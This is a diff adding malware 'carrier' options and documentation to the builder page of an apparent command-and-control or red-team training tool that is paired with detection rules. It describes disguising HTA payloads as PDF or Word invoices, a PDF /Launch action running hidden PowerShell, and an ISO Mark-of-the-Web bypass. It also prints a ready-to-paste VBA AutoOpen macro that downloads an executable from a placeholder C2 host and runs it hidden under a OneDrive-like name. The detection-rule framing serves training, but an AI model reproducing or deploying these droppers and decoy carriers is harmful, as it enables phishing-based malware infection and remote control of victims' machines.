@@ -571,13 +571,105 @@ function renderBuilder() {
     <button class="btn btn-sec" onclick="downloadCarrier('lnk')" style="font-size:12px;padding:9px 10px">
       &#128279; LNK Shortcut<br><span style="font-size:10px;color:var(--muted)">powershell.exe</span>
     </button>
+    <button class="btn btn-sec" onclick="downloadCarrier('pdf')" style="font-size:12px;padding:9px 10px">
+      &#128196; PDF Decoy<br><span style="font-size:10px;color:var(--muted)">mshta.exe (.pdf.hta)</span>
+    </button>
+    <button class="btn btn-sec" onclick="downloadCarrier('pdfexec')" style="font-size:12px;padding:9px 10px;border-color:var(--warn)">
+      &#128196; PDF Real<br><span style="font-size:10px;color:var(--warn)">genuine .pdf + /Launch</span>
+    </button>
+    <button class="btn btn-sec" onclick="downloadCarrier('word')" style="font-size:12px;padding:9px 10px">
+      &#128196; Word Decoy<br><span style="font-size:10px;color:var(--muted)">mshta.exe (.docx.hta)</span>
+    </button>
+    <button class="btn btn-sec" onclick="downloadCarrier('iso')" style="font-size:12px;padding:9px 10px">
+      &#128190; ISO Archive<br><span style="font-size:10px;color:var(--muted)">no MOTW (Linux only)</span>
+    </button>
   </div>
-  <div style="background:var(--bg);border:1px solid var(--bg3);border-radius:8px;padding:10px 14px;font-size:11px;color:var(--muted);line-height:1.8;margin-top:4px">
-    <strong style="color:var(--light)">Detection profile when using carriers:</strong><br>
-    Each carrier type triggers a <em>parent-process rule</em> on first C2 checkin
-    (e.g. <code style="color:var(--accent)">DR_017</code> for script engines, <code style="color:var(--accent)">DR_015</code> for Office spawns).<br>
-    Combined with <code style="color:var(--accent)">network_c2</code>, this fires
-    <code style="color:var(--accent)">COR_009 / COR_010</code> — carrier delivery incidents visible in the Detection tab.
+</div>
+
+<div class="card" style="max-width:680px;margin:0 auto">
+  <div class="card-title">&#128275; Carrier Detection Chain</div>
+  <p style="font-size:12px;color:var(--muted);line-height:1.6;margin-bottom:8px">
+    Each carrier triggers a detection rule based on the parent process the stub reports at first C2 checkin.
+    Rules fire automatically — no extra configuration needed.
+  </p>
+  <div style="display:flex;flex-direction:column;gap:10px">
+
+    <div style="background:var(--bg);border-radius:8px;padding:12px;border-left:3px solid #e74c3c">
+      <div style="font-size:11px;font-weight:700;color:#e74c3c;margin-bottom:4px">&#9733; GENUINE PDF (.pdf) — Real file + embedded /Launch action</div>
+      <div style="font-size:11px;color:var(--light);line-height:1.9">
+        <b>How:</b> A real <code style="color:var(--accent)">.pdf</code> file (not a renamed HTA). The invoice is fully readable in any PDF viewer.
+        The PDF <code style="color:var(--accent)">/OpenAction /Launch</code> entry runs
+        <code style="color:var(--accent)">powershell.exe -w hidden</code> silently at the same moment the document renders.<br>
+        <b>Adobe Reader v10+:</b> Shows a one-click "Allow" dialog — most non-IT users click through.<br>
+        <b>Foxit / SumatraPDF / unpatched readers:</b> Fires with no dialog at all.<br>
+        <b>Detection:</b> pname=AcroRd32.exe / Acrobat.exe / FoxitReader.exe &rarr; <span style="color:#F4A261">DR_016</span> (PDF Reader, HIGH, 85%)
+        + if C2 follows &rarr; <span style="color:#e74c3c">COR_009</span> (critical, 95%)<br>
+        <b>MITRE:</b> T1566.001 + T1059.001
+      </div>
+    </div>
+
+    <div style="background:var(--bg);border-radius:8px;padding:12px;border-left:3px solid #e74c3c">
+      <div style="font-size:11px;font-weight:700;color:#e74c3c;margin-bottom:4px">PDF / DOCX DECOY (.pdf.hta / .docx.hta)</div>
+      <div style="font-size:11px;color:var(--light);line-height:1.9">
+        <b>How:</b> Windows hides the <code style="color:var(--accent)">.hta</code> extension — target sees <code style="color:var(--accent)">Invoice.pdf</code>.
+        On double-click, <code style="color:var(--accent)">mshta.exe</code> runs the HTA. It silently fetches the real invoice PDF from
+        <code style="color:var(--accent)">/dl/decoy-pdf</code> and opens it visibly — the user sees an authentic-looking document.
+        Simultaneously the payload is downloaded to <code style="color:var(--accent)">%TEMP%</code> and launched hidden.<br>
+        <b>Detection:</b> pname=mshta.exe &rarr; <span style="color:#F4A261">DR_017</span> (Script Engine, HIGH, 80%)
+        + if C2 follows &rarr; <span style="color:#e74c3c">COR_010</span> (critical, 92%)<br>
+        <b>MITRE:</b> T1204.002 + T1059
+      </div>
+    </div>
+
+    <div style="background:var(--bg);border-radius:8px;padding:12px;border-left:3px solid #e67e22">
+      <div style="font-size:11px;font-weight:700;color:#e67e22;margin-bottom:4px">DOCM MACRO CARRIER (manual — create in Word)</div>
+      <div style="font-size:11px;color:var(--light);line-height:1.9">
+        <b>How:</b> A .docm file containing an <code style="color:var(--accent)">AutoOpen</code> VBA macro. winword.exe spawns the payload
+        &rarr; <span style="color:#F4A261">DR_015</span> (Office Application, HIGH, 90%).
+        Combined with C2 checkin &rarr; <span style="color:#e74c3c">COR_009</span> (critical, 95%).<br>
+        <b>VBA to paste into the macro editor (Alt+F11 in Word, save as .docm):</b>
+      </div>
+      <pre style="background:var(--bg3);border-radius:6px;padding:10px;font-size:11px;color:var(--accent);overflow-x:auto;margin-top:6px;line-height:1.6">Sub AutoOpen()
+  On Error Resume Next
+  Dim sh As Object
+  Set sh = CreateObject("WScript.Shell")
+  sh.Run "powershell -w hidden -nop -c """ & _
+         "$wc=New-Object Net.WebClient;" & _
+         "$wc.DownloadFile('http://YOUR_C2/dl/exe',$env:TEMP+'\\OneDriveHelper.exe');" & _
+         "Start-Process ($env:TEMP+'\\OneDriveHelper.exe') -WindowStyle Hidden""", 0, False
+End Sub</pre>
+      <div style="font-size:11px;color:var(--muted);margin-top:6px">Replace <code>YOUR_C2</code> with your server address. Enable macros when Word prompts. pname=winword.exe &rarr; DR_015 fires.</div>
+    </div>
+
+    <div style="background:var(--bg);border-radius:8px;padding:12px;border-left:3px solid #3498db">
+      <div style="font-size:11px;font-weight:700;color:#3498db;margin-bottom:4px">SCRIPT CARRIERS (HTA / PS1 / VBS / BAT / LNK)</div>
+      <div style="font-size:11px;color:var(--light);line-height:1.9">
+        Parent = mshta / powershell / wscript / cmd &rarr; <span style="color:#F4A261">DR_017</span> (Script Engine, 80%)<br>
+        + if C2 follows &rarr; <span style="color:#e74c3c">COR_010</span> (critical, 92%)<br>
+        <b>MITRE:</b> T1059
+      </div>
+    </div>
+
+    <div style="background:var(--bg);border-radius:8px;padding:12px;border-left:3px solid #9b59b6">
+      <div style="font-size:11px;font-weight:700;color:#9b59b6;margin-bottom:4px">ISO CARRIER (Linux VPS only — apt install genisoimage)</div>
+      <div style="font-size:11px;color:var(--light);line-height:1.9">
+        <b>How:</b> Wraps the exe inside a mountable ISO image. On older/unpatched Windows, mounting an ISO bypasses Mark-of-the-Web (MOTW),
+        so SmartScreen does not block the exe inside it. Target mounts the ISO, double-clicks the exe directly.<br>
+        <b>Note:</b> Patched by Microsoft in October 2022 (KB5016688). Still effective on unpatched enterprise machines.<br>
+        <b>MITRE:</b> T1553.005 (Mark of the Web bypass)
+      </div>
+    </div>
+
+    <div style="background:var(--bg);border-radius:8px;padding:12px;border-left:3px solid var(--muted)">
+      <div style="font-size:11px;font-weight:700;color:var(--light);margin-bottom:6px">Correlation Rules (fire when tags arrive within the time window)</div>
+      <div style="font-size:11px;color:var(--muted);line-height:1.9">
+        <span style="color:#e74c3c">COR_009</span> — doc_carrier + network_c2 within 120 s &rarr; <b>critical (95%)</b><br>
+        <span style="color:#e74c3c">COR_010</span> — script_carrier + network_c2 within 120 s &rarr; <b>critical (92%)</b><br>
+        <span style="color:#e74c3c">COR_011</span> — carrier_delivery + persistence within 300 s &rarr; <b>critical (90%)</b><br>
+        <span style="color:#e74c3c">COR_012</span> — carrier_delivery + proc_suspicious + persistence + network_c2 within 300 s &rarr; <b>critical (98%)</b>
+      </div>
+    </div>
+
   </div>
 </div>`;
 
